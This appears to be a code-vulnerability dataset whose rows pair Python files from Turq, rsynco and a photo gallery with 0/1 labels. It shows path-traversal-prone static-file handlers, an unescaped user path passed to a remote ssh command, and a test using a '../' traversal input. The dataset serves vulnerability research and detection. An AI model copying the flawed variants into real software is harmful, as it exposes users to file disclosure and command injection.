    editor.set_error_serializer(text_error_serializer)
    return wsgiref.simple_server.make_server(
        host, port, editor,
        IPv6EditorServer if ipv6 else EditorServer,
        EditorHandler)


def text_error_serializer(req, resp, exc):
    resp.body = exc.title


class EditorServer(socketserver.ThreadingMixIn,
                   wsgiref.simple_server.WSGIServer):

    address_family = socket.AF_INET
    allow_reuse_address = True
    daemon_threads = True

    def handle_error(self, request, client_address):
        # Do not print tracebacks.
        pass


class IPv6EditorServer(EditorServer):

    address_family = socket.AF_INET6


class EditorHandler(wsgiref.simple_server.WSGIRequestHandler):

    def log_message(self, *args):       # Do not log requests and responses.
        pass


class EditorResource:

    realm = 'Turq editor'
    template = string.Template(
        pkgutil.get_data('turq', 'editor/editor.html.tpl').decode('utf-8'))

    def __init__(self, mock_server, password):
        self.mock_server = mock_server
        self.password = password
        self.nonce = self.new_nonce()
        self._lock = threading.Lock()

    def on_get(self, req, resp):
        self.check_auth(req)
        resp.content_type = 'text/html; charset=utf-8'
        (mock_host, mock_port, *_) = self.mock_server.server_address
        resp.body = self.template.substitute(
            mock_host=html.escape(mock_host), mock_port=mock_port,
            mock_url=html.escape(guess_external_url(mock_host, mock_port)),
            rules=html.escape(self.mock_server.rules),
            examples=turq.examples.load_html(initial_header_level=3))

    def on_post(self, req, resp):
        self.check_auth(req)
        # Need `werkzeug.formparser` because JavaScript sends ``FormData``,
        # which is encoded as multipart.
        (_, form, _) = werkzeug.formparser.parse_form_data(req.env)
        if 'rules' not in form:
            raise falcon.HTTPBadRequest('Bad form')
        try:
            self.mock_server.install_rules(form['rules'])
        except SyntaxError as exc:
            resp.status = falcon.HTTP_422   # Unprocessable Entity
            resp.body = str(exc)
        else:
            resp.status = falcon.HTTP_303   # See Other
            resp.location = '/editor'
            resp.body = 'Rules installed successfully.'

    # We use HTTP digest authentication here, which provides a fairly high
    # level of protection. We use only one-time nonces, so replay attacks
    # should not be possible. An active man-in-the-middle could still intercept
    # a request and substitute their own rules; the ``auth-int`` option
    # is supposed to protect against that, but Chrome and Firefox (at least)
    # don't seem to support it.

    def check_auth(self, req):
        if not self.password:
            return
        auth = werkzeug.http.parse_authorization_header(req.auth)
        password_ok = False
        if self.check_password(req, auth):
            password_ok = True
            with self._lock:
                if auth.nonce == self.nonce:
                    self.nonce = self.new_nonce()
                    return
        raise falcon.HTTPUnauthorized(headers={
            'WWW-Authenticate':
                'Digest realm=""%s"", qop=""auth"", charset=UTF-8, '
                'nonce=""%s"", stale=%s' %
                (self.realm, self.nonce, 'true' if password_ok else 'false')})

    def check_password(self, req, auth):
        if not auth:
            return False
        a1 = '%s:%s:%s' % (auth.username, self.realm, self.password)
        a2 = '%s:%s' % (req.method, auth.uri)
        response = self.h('%s:%s:%s:%s:%s:%s' % (self.h(a1),
                                                 auth.nonce, auth.nc,
                                                 auth.cnonce, auth.qop,
                                                 self.h(a2)))
        return auth.response == response

    @staticmethod
    def h(s):               # pylint: disable=invalid-name
        return hashlib.md5(s.encode('utf-8')).hexdigest().lower()

    @staticmethod
    def new_nonce():
        return base64.b64encode(os.urandom(18)).decode()


class RedirectResource:

    def on_get(self, req, resp):
        raise falcon.HTTPFound('/editor')

    on_post = on_get


def static_file(req, resp):
    path = urllib.parse.urljoin('/', req.path)      # Avoid path traversal
    filename = path[len(STATIC_PREFIX):]
    try:
        resp.data = pkgutil.get_data('turq', 'editor/%s' % filename)
    except FileNotFoundError:
        raise falcon.HTTPNotFound()
    else:
        (resp.content_type, _) = mimetypes.guess_type(filename)


class DisableCache:

    def process_response(self, req, resp, resource, req_succeeded):
        resp.cache_control = ['no-store']
/n/n/n",1
128,903a15a1743df116eb01b5509c5cc6515e4370f8,"turq/editor.py/n/n# pylint: disable=unused-argument

import base64
import hashlib
import html
import mimetypes
import os
import pkgutil
import posixpath
import socket
import socketserver
import string
import threading
import wsgiref.simple_server

import falcon
import werkzeug.formparser

import turq.examples
from turq.util.http import guess_external_url


STATIC_PREFIX = '/static/'


def make_server(host, port, ipv6, password, mock_server):
    editor = falcon.API(media_type='text/plain; charset=utf-8',
                        # This server is very volatile: who knows what will be
                        # listening on this host and port tomorrow? So, disable
                        # caching completely. We don't want Chrome to prompt
                        # to ""Show saved copy"" when Turq is not running, etc.
                        middleware=[DisableCache()])
    # Microsoft Edge doesn't send ``Authorization: Digest`` to ``/``.
    # Can be circumvented with ``/?``, but I think ``/editor`` is better.
    editor.add_route('/editor', EditorResource(mock_server, password))
    editor.add_route('/', RedirectResource())
    editor.add_sink(static_file, STATIC_PREFIX)
    editor.set_error_serializer(text_error_serializer)
    return wsgiref.simple_server.make_server(
        host, port, editor,
        IPv6EditorServer if ipv6 else EditorServer,
        EditorHandler)


def text_error_serializer(req, resp, exc):
    resp.body = exc.title


class EditorServer(socketserver.ThreadingMixIn,
                   wsgiref.simple_server.WSGIServer):

    address_family = socket.AF_INET
    allow_reuse_address = True
    daemon_threads = True

    def handle_error(self, request, client_address):
        # Do not print tracebacks.
        pass


class IPv6EditorServer(EditorServer):

    address_family = socket.AF_INET6


class EditorHandler(wsgiref.simple_server.WSGIRequestHandler):

    def log_message(self, *args):       # Do not log requests and responses.
        pass


class EditorResource:

    realm = 'Turq editor'
    template = string.Template(
        pkgutil.get_data('turq', 'editor/editor.html.tpl').decode('utf-8'))

    def __init__(self, mock_server, password):
        self.mock_server = mock_server
        self.password = password
        self.nonce = self.new_nonce()
        self._lock = threading.Lock()

    def on_get(self, req, resp):
        self.check_auth(req)
        resp.content_type = 'text/html; charset=utf-8'
        (mock_host, mock_port, *_) = self.mock_server.server_address
        resp.body = self.template.substitute(
            mock_host=html.escape(mock_host), mock_port=mock_port,
            mock_url=html.escape(guess_external_url(mock_host, mock_port)),
            rules=html.escape(self.mock_server.rules),
            examples=turq.examples.load_html(initial_header_level=3))

    def on_post(self, req, resp):
        self.check_auth(req)
        # Need `werkzeug.formparser` because JavaScript sends ``FormData``,
        # which is encoded as multipart.
        (_, form, _) = werkzeug.formparser.parse_form_data(req.env)
        if 'rules' not in form:
            raise falcon.HTTPBadRequest('Bad form')
        try:
            self.mock_server.install_rules(form['rules'])
        except SyntaxError as exc:
            resp.status = falcon.HTTP_422   # Unprocessable Entity
            resp.body = str(exc)
        else:
            resp.status = falcon.HTTP_303   # See Other
            resp.location = '/editor'
            resp.body = 'Rules installed successfully.'

    # We use HTTP digest authentication here, which provides a fairly high
    # level of protection. We use only one-time nonces, so replay attacks
    # should not be possible. An active man-in-the-middle could still intercept
    # a request and substitute their own rules; the ``auth-int`` option
    # is supposed to protect against that, but Chrome and Firefox (at least)
    # don't seem to support it.

    def check_auth(self, req):
        if not self.password:
            return
        auth = werkzeug.http.parse_authorization_header(req.auth)
        password_ok = False
        if self.check_password(req, auth):
            password_ok = True
            with self._lock:
                if auth.nonce == self.nonce:
                    self.nonce = self.new_nonce()
                    return
        raise falcon.HTTPUnauthorized(headers={
            'WWW-Authenticate':
                'Digest realm=""%s"", qop=""auth"", charset=UTF-8, '
                'nonce=""%s"", stale=%s' %
                (self.realm, self.nonce, 'true' if password_ok else 'false')})

    def check_password(self, req, auth):
        if not auth:
            return False
        a1 = '%s:%s:%s' % (auth.username, self.realm, self.password)
        a2 = '%s:%s' % (req.method, auth.uri)
        response = self.h('%s:%s:%s:%s:%s:%s' % (self.h(a1),
                                                 auth.nonce, auth.nc,
                                                 auth.cnonce, auth.qop,
                                                 self.h(a2)))
        return auth.response == response

    @staticmethod
    def h(s):               # pylint: disable=invalid-name
        return hashlib.md5(s.encode('utf-8')).hexdigest().lower()

    @staticmethod
    def new_nonce():
        return base64.b64encode(os.urandom(18)).decode()


class RedirectResource:

    def on_get(self, req, resp):
        raise falcon.HTTPFound('/editor')

    on_post = on_get


def static_file(req, resp):
    path = '/' + req.path[len(STATIC_PREFIX):]
    path = posixpath.normpath(path.replace('\\', '/'))   # Avoid path traversal
    try:
        resp.data = pkgutil.get_data('turq', 'editor%s' % path)
    except FileNotFoundError:
        raise falcon.HTTPNotFound()
    else:
        (resp.content_type, _) = mimetypes.guess_type(path)


class DisableCache:

    def process_response(self, req, resp, resource, req_succeeded):
        resp.cache_control = ['no-store']
/n/n/n",0
129,903a15a1743df116eb01b5509c5cc6515e4370f8,"/turq/editor.py/n/n# pylint: disable=unused-argument

import base64
import hashlib
import html
import mimetypes
import os
import pkgutil
import posixpath
import socket
import socketserver
import string
import threading
import wsgiref.simple_server

import falcon
import werkzeug.formparser

import turq.examples
from turq.util.http import guess_external_url


STATIC_PREFIX = '/static/'


def make_server(host, port, ipv6, password, mock_server):
    editor = falcon.API(media_type='text/plain; charset=utf-8',
                        # This server is very volatile: who knows what will be
                        # listening on this host and port tomorrow? So, disable
                        # caching completely. We don't want Chrome to prompt
                        # to ""Show saved copy"" when Turq is not running, etc.
                        middleware=[DisableCache()])
    # Microsoft Edge doesn't send ``Authorization: Digest`` to ``/``.
    # Can be circumvented with ``/?``, but I think ``/editor`` is better.
    editor.add_route('/editor', EditorResource(mock_server, password))
    editor.add_route('/', RedirectResource())
    editor.add_sink(static_file, STATIC_PREFIX)
    editor.set_error_serializer(text_error_serializer)
    return wsgiref.simple_server.make_server(
        host, port, editor,
        IPv6EditorServer if ipv6 else EditorServer,
        EditorHandler)


def text_error_serializer(req, resp, exc):
    resp.body = exc.title


class EditorServer(socketserver.ThreadingMixIn,
                   wsgiref.simple_server.WSGIServer):

    address_family = socket.AF_INET
    allow_reuse_address = True
    daemon_threads = True

    def handle_error(self, request, client_address):
        # Do not print tracebacks.
        pass


class IPv6EditorServer(EditorServer):

    address_family = socket.AF_INET6


class EditorHandler(wsgiref.simple_server.WSGIRequestHandler):

    def log_message(self, *args):       # Do not log requests and responses.
        pass


class EditorResource:

    realm = 'Turq editor'
    template = string.Template(
        pkgutil.get_data('turq', 'editor/editor.html.tpl').decode('utf-8'))

    def __init__(self, mock_server, password):
        self.mock_server = mock_server
        self.password = password
        self.nonce = self.new_nonce()
        self._lock = threading.Lock()

    def on_get(self, req, resp):
        self.check_auth(req)
        resp.content_type = 'text/html; charset=utf-8'
        (mock_host, mock_port, *_) = self.mock_server.server_address
        resp.body = self.template.substitute(
            mock_host=html.escape(mock_host), mock_port=mock_port,
            mock_url=html.escape(guess_external_url(mock_host, mock_port)),
            rules=html.escape(self.mock_server.rules),
            examples=turq.examples.load_html(initial_header_level=3))

    def on_post(self, req, resp):
        self.check_auth(req)
        # Need `werkzeug.formparser` because JavaScript sends ``FormData``,
        # which is encoded as multipart.
        (_, form, _) = werkzeug.formparser.parse_form_data(req.env)
        if 'rules' not in form:
            raise falcon.HTTPBadRequest('Bad form')
        try:
            self.mock_server.install_rules(form['rules'])
        except SyntaxError as exc:
            resp.status = falcon.HTTP_422   # Unprocessable Entity
            resp.body = str(exc)
        else:
            resp.status = falcon.HTTP_303   # See Other
            resp.location = '/editor'
            resp.body = 'Rules installed successfully.'

    # We use HTTP digest authentication here, which provides a fairly high
    # level of protection. We use only one-time nonces, so replay attacks
    # should not be possible. An active man-in-the-middle could still intercept
    # a request and substitute their own rules; the ``auth-int`` option
    # is supposed to protect against that, but Chrome and Firefox (at least)
    # don't seem to support it.

    def check_auth(self, req):
        if not self.password:
            return
        auth = werkzeug.http.parse_authorization_header(req.auth)
        password_ok = False
        if self.check_password(req, auth):
            password_ok = True
            with self._lock:
                if auth.nonce == self.nonce:
                    self.nonce = self.new_nonce()
                    return
        raise falcon.HTTPUnauthorized(headers={
            'WWW-Authenticate':
                'Digest realm=""%s"", qop=""auth"", charset=UTF-8, '
                'nonce=""%s"", stale=%s' %
                (self.realm, self.nonce, 'true' if password_ok else 'false')})

    def check_password(self, req, auth):
        if not auth:
            return False
        a1 = '%s:%s:%s' % (auth.username, self.realm, self.password)
        a2 = '%s:%s' % (req.method, auth.uri)
        response = self.h('%s:%s:%s:%s:%s:%s' % (self.h(a1),
                                                 auth.nonce, auth.nc,
                                                 auth.cnonce, auth.qop,
                                                 self.h(a2)))
        return auth.response == response

    @staticmethod
    def h(s):               # pylint: disable=invalid-name
        return hashlib.md5(s.encode('utf-8')).hexdigest().lower()

    @staticmethod
    def new_nonce():
        return base64.b64encode(os.urandom(18)).decode()


class RedirectResource:

    def on_get(self, req, resp):
        raise falcon.HTTPFound('/editor')

    on_post = on_get


def static_file(req, resp):
    path = '/' + req.path[len(STATIC_PREFIX):]
    path = posixpath.normpath(path)           # Avoid path traversal
    try:
        resp.data = pkgutil.get_data('turq', 'editor%s' % path)
    except FileNotFoundError:
        raise falcon.HTTPNotFound()
    else:
        (resp.content_type, _) = mimetypes.guess_type(path)


class DisableCache:

    def process_response(self, req, resp, resource, req_succeeded):
        resp.cache_control = ['no-store']
/n/n/n",1
130,6fbbcf50c5a244515f7053bb9ec025202812797e,"rsynco/api/paths.py/n/nfrom .apihandler import ApiHandler
from rsynco.api.transformers.path_transformer import PathTransformer
import logging
from rsynco.libs.ssh import PathNotFoundException
from rsynco.libs.ssh import Ssh


class Paths(ApiHandler):
    def __init__(self):
        pass

    def GET(self, host=None, path=None):
        if host is None or path is None:
            logging.warning('API: Either host or path are missing, nothing returned')
            return PathTransformer.paths([])

        try:
            ssh = Ssh()
            contents = ssh.get_contents(host, path)
            sorted_contents = sorted(contents, key=lambda x: x['type'] + ':' + x['name'].lower(), reverse=False)
            return PathTransformer.paths(sorted_contents)
        except PathNotFoundException as e:
            logging.warning('API: Path {} not found, nearest path {}'.format(path, e.nearest_path))
            return PathTransformer.nearest_path(e.nearest_path)
/n/n/nrsynco/libs/ssh.py/n/nimport logging
from pathlib import Path
import psutil
from subprocess import PIPE
import re


class PathNotFoundException(Exception):
    def __init__(self, nearest_path=''):
        self.nearest_path = nearest_path


class SshConfig:
    """"""
    Parse SSH config files to their basic host details
    """"""
    def __init__(self, file):
        self.file = file
        self.hosts = list()
        self.parse()

    def new_host(self):
        return dict({'host': '', 'hostname': '', 'port': 22, 'username': '', 'password': '', 'type': 'system'})

    def parse(self):
        logging.debug('Parsing SSH config file {}'.format(str(self.file)))
        if not self.file.is_file():
            logging.debug('SSH config does not exist')
            return

        with self.file.open('r') as ssh_config:
            host = self.new_host()
            for line in ssh_config.readlines():
                stripped_line = line.strip(' \t\n')
                if stripped_line != '' and stripped_line[:1] != '#':
                    tokens = stripped_line.split()
                    if tokens[0].lower() == 'host' and len(tokens) > 1:
                        if host['host'] != '' and host['hostname'] != '':
                            self.hosts.append(host)
                        host = self.new_host()
                        host['host'] = tokens[1]
                    elif tokens[0].lower() == 'hostname' and len(tokens) > 1:
                        host['hostname'] = tokens[1]
                    elif tokens[0].lower() == 'port' and len(tokens) > 1:
                        host['port'] = int(tokens[1])
                    elif tokens[0].lower() == 'user' and len(tokens) > 1:
                        host['username'] = tokens[1]

            if host['host'] != '' and host['hostname'] != '':
                self.hosts.append(host)


class Ssh:
    def get_contents(self, host, path):
        parsed_path = Path(path)

        if host == ""localhost"":
            contents = self.local_listing(parsed_path)
        else:
            contents = self.remote_listing(host, parsed_path)

        return contents

    def local_listing(self, path):
        logging.debug('API: Getting local path %s contents' % path.as_posix())
        contents = list()

        # Work our way up the tree till we find a valid path or root
        logging.debug('Checking path %s' % path)
        if not path.exists():
            while not path.exists():
                logging.debug('Path does not exist, working up the tree...')
                logging.debug(path.as_posix())
                path = path.parent

            raise PathNotFoundException(path.as_posix())

        # localhost first
        for part in path.iterdir():
            if part.is_file():
                contents.append({
                    'name': part.name,
                    'type': 'file'
                })
            elif part.is_dir():
                contents.append({
                    'name': part.name,
                    'type': 'dir'
                })
            elif part.is_symlink():
                contents.append({
                    'name': part.name,
                    'type': 'link'
                })

        return contents

    def remote_exists(self, host, path):
        logging.debug(""Escaping path"")
        escaped_path = '""""{}""""'.format(path.as_posix().replace(' ', '\\ '))
        p = psutil.Popen(['ssh', host, 'ls', '-Fa', escaped_path], stdout=PIPE, stderr=PIPE)
        main_output, main_error = p.communicate()

        error = main_error.decode(encoding='UTF-8')
        error_matched = re.search('No such file or directory', error)

        logging.debug(error)

        if error_matched is not None:
            logging.debug('Path not found')
            return False
        else:
            return True

    def remote_iterdir(self, host, path):
        # Call out to the remote host
        escaped_path = '""""{}""""'.format(path.as_posix().replace(' ', '\\ '))
        p = psutil.Popen(['ssh', host, 'ls', '-Fa', escaped_path], stdout=PIPE, stderr=PIPE)
        main_output, main_error = p.communicate()

        logging.debug(main_error.decode(encoding='UTF-8'))
        return main_output.decode(encoding='UTF-8').split(""\n"")

    def remote_listing(self, host, path):
        logging.debug('API: Getting remote host %s path %s contents' % (host, path))
        contents = list()

        logging.debug('Checking path %s' % path)
        if not self.remote_exists(host, path):
            while not self.remote_exists(host, path):
                logging.debug('Path does not exist, working up the tree...')
                logging.debug(path.as_posix())
                path = path.parent

            raise PathNotFoundException(path.as_posix())

        for line in self.remote_iterdir(host, path):
            logging.debug(line)
            if len(line) > 0 and line != './' and line != '../':
                if line[-1] == '/':
                    contents.append({
                        'type': 'dir',
                        'name': line[:-1]
                    })
                elif line[-1] == '@':
                    contents.append({
                        'type': 'link',
                        'name': line[:-1]
                    })
                elif line[-1] == '*':
                    contents.append({
                        'type': 'file',
                        'name': line[:-1]
                    })
                elif line[-1] not in ['#']:
                    contents.append({
                        'type': 'file',
                        'name': line
                    })

        return contents
/n/n/n",0
131,6fbbcf50c5a244515f7053bb9ec025202812797e,"/rsynco/libs/ssh.py/n/nimport logging
from pathlib import Path
import psutil
from subprocess import PIPE
import re


class PathNotFoundException(Exception):
    def __init__(self, nearest_path=''):
        self.nearest_path = nearest_path


class SshConfig:
    """"""
    Parse SSH config files to their basic host details
    """"""
    def __init__(self, file):
        self.file = file
        self.hosts = list()
        self.parse()

    def new_host(self):
        return dict({'host': '', 'hostname': '', 'port': 22, 'username': '', 'password': '', 'type': 'system'})

    def parse(self):
        logging.debug('Parsing SSH config file {}'.format(str(self.file)))
        if not self.file.is_file():
            logging.debug('SSH config does not exist')
            return

        with self.file.open('r') as ssh_config:
            host = self.new_host()
            for line in ssh_config.readlines():
                stripped_line = line.strip(' \t\n')
                if stripped_line != '' and stripped_line[:1] != '#':
                    tokens = stripped_line.split()
                    if tokens[0].lower() == 'host' and len(tokens) > 1:
                        if host['host'] != '' and host['hostname'] != '':
                            self.hosts.append(host)
                        host = self.new_host()
                        host['host'] = tokens[1]
                    elif tokens[0].lower() == 'hostname' and len(tokens) > 1:
                        host['hostname'] = tokens[1]
                    elif tokens[0].lower() == 'port' and len(tokens) > 1:
                        host['port'] = int(tokens[1])
                    elif tokens[0].lower() == 'user' and len(tokens) > 1:
                        host['username'] = tokens[1]

            if host['host'] != '' and host['hostname'] != '':
                self.hosts.append(host)


class Ssh:
    def get_contents(self, host, path):
        parsed_path = Path(path)

        if host == ""localhost"":
            contents = self.local_listing(parsed_path)
        else:
            contents = self.remote_listing(host, parsed_path)

        return contents

    def local_listing(self, path):
        logging.debug('API: Getting local path %s contents' % path.as_posix())
        contents = list()

        # Work our way up the tree till we find a valid path or root
        logging.debug('Checking path %s' % path)
        if not path.exists():
            while not path.exists():
                logging.debug('Path does not exist, working up the tree...')
                logging.debug(path.as_posix())
                path = path.parent

            raise PathNotFoundException(path.as_posix())

        # localhost first
        for part in path.iterdir():
            if part.is_file():
                contents.append({
                    'name': part.name,
                    'type': 'file'
                })
            elif part.is_dir():
                contents.append({
                    'name': part.name,
                    'type': 'dir'
                })
            elif part.is_symlink():
                contents.append({
                    'name': part.name,
                    'type': 'link'
                })

        return contents

    def remote_exists(self, host, path):
        p = psutil.Popen(['ssh', host, 'ls', '-Fa', path.as_posix()], stdout=PIPE, stderr=PIPE)
        main_output, main_error = p.communicate()

        error = main_error.decode(encoding='UTF-8')
        error_matched = re.search('No such file or directory', error)

        if error_matched is not None:
            logging.debug('Path not found')
            return False
        else:
            return True

    def remote_iterdir(self, host, path):
        # Call out to the remote host
        p = psutil.Popen(['ssh', host, 'ls', '-Fa', path.as_posix()], stdout=PIPE, stderr=PIPE)
        main_output, main_error = p.communicate()

        logging.debug(main_error.decode(encoding='UTF-8'))
        return main_output.decode(encoding='UTF-8').split(""\n"")

    def remote_listing(self, host, path):
        logging.debug('API: Getting remote host %s path %s contents' % (host, path))
        contents = list()

        logging.debug('Checking path %s' % path)
        if not self.remote_exists(host, path):
            while not self.remote_exists(host, path):
                logging.debug('Path does not exist, working up the tree...')
                logging.debug(path.as_posix())
                path = path.parent

            raise PathNotFoundException(path.as_posix())

        for line in self.remote_iterdir(host, path):
            logging.debug(line)
            if len(line) > 0 and line != './' and line != '../':
                if line[-1] == '/':
                    contents.append({
                        'type': 'dir',
                        'name': line[:-1]
                    })
                elif line[-1] == '@':
                    contents.append({
                        'type': 'link',
                        'name': line[:-1]
                    })
                elif line[-1] == '*':
                    contents.append({
                        'type': 'file',
                        'name': line[:-1]
                    })
                elif line[-1] not in ['#']:
                    contents.append({
                        'type': 'file',
                        'name': line
                    })

        return contents
/n/n/n",1
132,60dec5c580a779ae27824ed54cb113eca25afdc0,"gallery/gallery.py/n/nimport json
import logging
import os.path
import shutil
from glob import glob
from urllib.parse import quote

import aiohttp_jinja2
import jinja2
from aiohttp import web
# from PIL import Image
from pyexiv2 import ImageMetadata
from natsort import natsorted

# from gallery import settings
import settings


BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
logger = logging.getLogger(__name__)


class Item():
    """"""
    An image in your storage.

    Called `Item` to avoid clashing with PIL's `Image`.
    """"""
    # IPTC values:
    #   http://www.sno.phy.queensu.ca/~phil/exiftool/TagNames/IPTC.html
    # Based on:
    #   https://www.flickr.com/groups/51035612836@N01/discuss/72057594065133113/
    # Useful tags are: Caption-Abstract, ObjectName == Headline, Keywords
    FORM = (
        'Iptc.Application2.Headline',
        'Iptc.Application2.Caption',
        # 'Iptc.Application2.Keywords',  # TODO
    )

    """"""A gallery item.""""""
    def __init__(self, path):
        self.path = path
        self.abspath = settings.STORAGE_DIR + path  # why does os.path.join not work?
        self.meta = ImageMetadata(self.abspath)
        self.meta.read()

    def __str__(self):
        return os.path.basename(self.path)

    @property
    def src(self):
        """"""Get the html 'src' attribute.""""""
        return quote(self.path)

    @property
    def backup_abspath(self):
        """"""
        The absolute path to where the backup for this image should go.

        In the future we may a new setting so originals aren't cluttering the
        storage directory.
        """"""
        return self.abspath + '.original'

    @property
    def keywords(self):
        return self.meta.get('Iptc.Application2.Keywords').value

    @property
    def headline(self):
        return self.meta.get('Iptc.Application2.Headline').value

    def get_safe_value(self, meta, key):
        """"""
        Get the meta value or an empty string.

        http://python3-exiv2.readthedocs.io/en/latest/api.html
        http://python3-exiv2.readthedocs.io/en/latest/tutorial.html
        """"""
        try:
            val = meta[key].value
            if meta[key].repeatable:
                return val

            return val[0]

        except UnicodeDecodeError:
            logger.warn('%s could not get meta for %s', self, key)
            return ''

    def get_meta_used(self):
        """"""List what meta tags were used in a human-readable format.""""""
        return self.meta.iptc_keys

    def get_all_meta(self):
        """"""Dict of meta tags were used in a human-readable format.""""""
        return {key: self.get_safe_value(self.meta, key) for key in self.meta.iptc_keys}

    def get_form_fields(self):
        ret = []
        for field in self.FORM:
            if field in self.meta.iptc_keys:
                ret.append((field, self.get_safe_value(self.meta, field)))
            else:
                ret.append((field, ''))
        return ret


@aiohttp_jinja2.template('index.html')
async def homepage(request):
    # TODO get *.jpeg too
    images = natsorted(
        glob(os.path.join(settings.STORAGE_DIR, '**/*.jpg'), recursive=True),
        key=lambda x: x.upper(),
    )
    return {'images': (Item(x.replace(settings.STORAGE_DIR, '')) for x in images)}


async def save(request):
    # TODO csrf
    data = await request.post()
    item = Item(data['src'])

    # Update name
    new_src = data.get('new_src')
    if new_src:
        new_abspath = os.path.abspath(settings.STORAGE_DIR + new_src)
        if not new_abspath.startswith(settings.STORAGE_DIR):
            return web.Response(status=400, body=b'Invalid Request')

        if new_abspath != item.abspath:
            shutil.move(item.abspath, new_abspath)
            old_backup_abspath = item.backup_abspath
            item = Item(new_src)
            if os.path.isfile(old_backup_abspath):
                shutil.move(old_backup_abspath, item.backup_abspath)

    # Update meta
    for field in item.FORM:
        # TODO handle .repeatable (keywords)
        item.meta[field] = [data.get(field, '')]

    if settings.SAVE_ORIGINALS and not os.path.isfile(item.backup_abspath):
        shutil.copyfile(item.abspath, item.backup_abspath)

    # WISHLIST don't write() if nothing changed
    item.meta.write()

    return web.Response(
        status=200,
        body=json.dumps(item.get_form_fields()).encode('utf8'),
        content_type='application/json',
    )


def check_settings(settings):
    """"""
    Raises exception if there's something wrong with the settings.
    """"""
    # TODO make sure STORAGE_DIR is writeable
    return True


def create_app(loop=None):
    if loop is None:
        app = web.Application()
    else:
        app = web.Application(loop=loop)
    app.router.add_static('/images', settings.STORAGE_DIR)
    app.router.add_static('/static', os.path.join(BASE_DIR, 'app'))
    app.router.add_route('GET', '/', homepage)
    app.router.add_route('POST', '/save/', save)
    return app


if __name__ == '__main__':
    check_settings(settings)
    app = create_app()
    aiohttp_jinja2.setup(
        app,
        loader=jinja2.FileSystemLoader(os.path.join(BASE_DIR, 'templates')),
    )
    web.run_app(app)
/n/n/ngallery/gallery_test.py/n/nimport os
import random
import shutil
from unittest.mock import patch

import pytest
from aiohttp.test_utils import make_mocked_request
from multidict import MultiDict

from .gallery import save, settings, Item


BASE_DIR = os.path.dirname(os.path.abspath(__file__))
FIXTURES_DIR = os.path.join(BASE_DIR, 'fixtures/')
pytest_plugins = 'aiohttp.pytest_plugin'


@pytest.fixture
def jpeg(request):
    """"""Make a temp JPEG. Returns the path relative to FIXTURES_DIR.""""""
    def fin():
        try:
            os.unlink(os.path.join(FIXTURES_DIR, 'tmpLenna.jpg'))
            # XXX assumes SAVE_ORIGINALS == True
            os.unlink(os.path.join(FIXTURES_DIR, 'tmpLenna.jpg.original'))
        except FileNotFoundError:
            pass

    shutil.copyfile(os.path.join(FIXTURES_DIR, 'Lenna.jpg'),
                    os.path.join(FIXTURES_DIR, 'tmpLenna.jpg'))
    request.addfinalizer(fin)
    return 'tmpLenna.jpg'


async def test_handler_save(jpeg):
    headline = 'headline {}'.format(random.randint(0, 99))
    caption = 'caption {}'.format(random.randint(0, 99))

    async def post():
        return MultiDict({
            'src': jpeg,
            'Iptc.Application2.Headline': headline,
            'Iptc.Application2.Caption': caption,
        })

    req = make_mocked_request('post', '/foo/')
    req.post = post

    with patch.object(settings, 'STORAGE_DIR', new=FIXTURES_DIR):
        resp = await save(req)

        assert resp.status == 200

        item = Item(jpeg)
        assert item.meta['Iptc.Application2.Headline'].value == [headline]
        assert item.meta['Iptc.Application2.Caption'].value == [caption]

        # XXX assumes SAVE_ORIGINALS == True
        assert os.path.isfile(item.backup_abspath)


async def test_handler_save_can_rename(jpeg):
    async def post():
        return MultiDict({
            'src': jpeg,
            'new_src': '/tmpDeleteme.jpg',
        })

    req = make_mocked_request('post', '/foo/')
    req.post = post

    with patch.object(settings, 'STORAGE_DIR', new=FIXTURES_DIR):
        resp = await save(req)

        assert resp.status == 200

        item = Item('/tmpDeleteme.jpg')

        assert os.path.isfile(item.abspath)
        os.unlink(item.abspath)
        # XXX assumes SAVE_ORIGINALS == True
        assert os.path.isfile(item.backup_abspath)
        os.unlink(item.backup_abspath)


async def test_handler_save_errors_with_invalid_name(jpeg):
    async def post():
        return MultiDict({
            'src': jpeg,
            'new_src': '/../tmpDeleteme.jpg',
        })

    req = make_mocked_request('post', '/foo/')
    req.post = post

    with patch.object(settings, 'STORAGE_DIR', new=FIXTURES_DIR):
        resp = await save(req)

        assert resp.status == 400
/n/n/n",0
133,60dec5c580a779ae27824ed54cb113eca25afdc0,"/gallery/gallery.py/n/nimport json
import logging
import os.path
import shutil
from glob import glob
from urllib.parse import quote

import aiohttp_jinja2
import jinja2
from aiohttp import web
# from PIL import Image
from pyexiv2 import ImageMetadata
from natsort import natsorted

# from gallery import settings
import settings


BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
logger = logging.getLogger(__name__)


class Item():
    """"""
    An image in your storage.

    Called `Item` to avoid clashing with PIL's `Image`.
    """"""
    # IPTC values:
    #   http://www.sno.phy.queensu.ca/~phil/exiftool/TagNames/IPTC.html
    # Based on:
    #   https://www.flickr.com/groups/51035612836@N01/discuss/72057594065133113/
    # Useful tags are: Caption-Abstract, ObjectName == Headline, Keywords
    FORM = (
        'Iptc.Application2.Headline',
        'Iptc.Application2.Caption',
        # 'Iptc.Application2.Keywords',  # TODO
    )

    """"""A gallery item.""""""
    def __init__(self, path):
        self.path = path
        self.abspath = settings.STORAGE_DIR + path  # why does os.path.join not work?
        self.meta = ImageMetadata(self.abspath)
        self.meta.read()

    def __str__(self):
        return os.path.basename(self.path)

    @property
    def src(self):
        """"""Get the html 'src' attribute.""""""
        return quote(self.path)

    @property
    def backup_abspath(self):
        """"""
        The absolute path to where the backup for this image should go.

        In the future we may a new setting so originals aren't cluttering the
        storage directory.
        """"""
        return self.abspath + '.original'

    @property
    def keywords(self):
        return self.meta.get('Iptc.Application2.Keywords').value

    @property
    def headline(self):
        return self.meta.get('Iptc.Application2.Headline').value

    def get_safe_value(self, meta, key):
        """"""
        Get the meta value or an empty string.

        http://python3-exiv2.readthedocs.io/en/latest/api.html
        http://python3-exiv2.readthedocs.io/en/latest/tutorial.html
        """"""
        try:
            val = meta[key].value
            if meta[key].repeatable:
                return val

            return val[0]

        except UnicodeDecodeError:
            logger.warn('%s could not get meta for %s', self, key)
            return ''

    def get_meta_used(self):
        """"""List what meta tags were used in a human-readable format.""""""
        return self.meta.iptc_keys

    def get_all_meta(self):
        """"""Dict of meta tags were used in a human-readable format.""""""
        return {key: self.get_safe_value(self.meta, key) for key in self.meta.iptc_keys}

    def get_form_fields(self):
        ret = []
        for field in self.FORM:
            if field in self.meta.iptc_keys:
